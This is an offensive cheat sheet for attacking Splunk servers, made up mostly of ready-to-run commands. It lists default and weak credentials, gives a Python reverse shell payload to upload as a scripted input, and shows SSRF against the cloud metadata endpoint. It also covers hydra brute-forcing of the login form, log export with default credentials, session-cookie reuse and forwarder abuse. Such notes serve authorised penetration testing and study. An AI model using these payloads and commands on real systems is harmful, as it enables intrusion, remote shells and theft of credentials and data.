# Splunk Discovery and Enumeration

## 1. Discovery

### Nmap Port Scan

```bash
nmap -sV <target_ip> -p 8000,8089
```

### Web Interface Access

```bash
http://<target_ip>:8000
```

Default credentials (older versions):
* `admin:changeme`
* Common weak passwords: `admin`, `Welcome`, `Password123`

If no login prompt appears, the instance may be running **Splunk Free** (unauthenticated).

### Version Detection

Check web response headers or query the API to determine version details.

---

## 2. Enumeration

### Splunk Free Check

Absence of authentication suggests a **Splunk Free** deployment.

### Web Interface Exploration

* Review dashboards, reports, and logs.
* Identify installed Splunkbase apps or inputs.

### Scripted Inputs (Potential RCE)

If write access is available, upload custom scripts as inputs.
Example reverse shell payload:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### REST API (Port 8089)

Enumerate API endpoints for system information.

```bash
curl -k -u admin:changeme https://<target_ip>:8089/services/server/info
```

### Vulnerability Scanning

Use **Nessus**, **OpenVAS**, or CVE repositories (NVD, Exploit-DB) to identify version-specific vulnerabilities.

### SSRF Testing

```bash
curl -k -X POST -H "Content-Type: application/x-www-form-urlencoded" \
-d "splunk_server=127.0.0.1&remote_server=http://169.254.169.254/latest/meta-data/" \
https://<target_ip>:8089/en-US/splunkd/__raw/services/data/inputs/http
```

### Credential Brute-forcing

```bash
hydra -L users.txt -P passwords.txt <target_ip> http-form-post "/en-US/account/login:username=^USER^&password=^PASS^:Invalid username or password"
```

### Log Extraction

If authenticated, export indexed logs:

```bash
curl -k -u admin:changeme https://<target_ip>:8089/services/search/jobs/export -d search="search index=_internal | head 10"
```

### Session Hijacking

Reuse a valid session cookie:

```bash
curl -k -b "splunkd_8000=<session_cookie>" https://<target_ip>:8000/en-US/
```

### Splunk Forwarder Abuse

If access to a forwarder is gained, edit `inputs.conf` to insert payloads or redirect logs.
